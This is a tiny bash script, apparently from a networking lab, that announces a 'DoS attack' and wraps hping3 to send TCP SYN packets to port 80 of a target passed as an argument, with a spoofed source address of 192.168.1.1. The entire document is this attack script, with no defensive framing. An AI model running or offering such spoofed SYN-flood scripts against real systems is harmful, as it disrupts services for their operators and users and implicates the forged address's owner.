#!/bin/bash

# Ceci est un commentaire
echo "*** christian: performing DoS attack 1 ***"

# hping3 for the attacks
function attack() {
    sudo hping3 -S $1 -a 192.168.1.1 -p 80 -c 5
}

attack $1
